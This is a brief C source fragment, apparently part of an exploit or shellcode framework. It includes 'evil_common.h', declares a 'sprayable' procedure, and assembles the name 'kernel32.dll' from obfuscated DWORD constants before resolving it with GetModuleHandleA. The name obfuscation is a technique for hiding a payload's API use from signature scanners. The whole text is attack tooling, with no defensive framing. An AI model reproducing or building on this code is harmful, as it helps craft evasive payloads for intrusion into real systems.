//@@@headers
#include "evil_common.h"
//@@@endheaders

//@@@zvars
DWORD   cmn_obf_dword;
HMODULE g_hDll;
HMODULE g_hKernel32;
HMODULE g_hEvil;
DWORD   g_dwP2Ret; // obsolete name; new meaning.

DWORD cmn_namebuf[4];
//@@@endzvars


SPRAYABLE_PROC(common_init) {
  //@@@proc /name common_init
  Z(cmn_obf_dword) = OBFUSCATION_DWORD;
  Z(cmn_namebuf[0]) = ObfDw('nrek'); // 'kernel32.dll'
  Z(cmn_namebuf[1]) = ObfDw('23le');
  Z(cmn_namebuf[2]) = ObfDw('lld.');
  Z(cmn_namebuf[3]) = 0;
  Z(g_hKernel32) = GetModuleHandleA((char*)Z(cmn_namebuf));
  //@@@endproc 
}

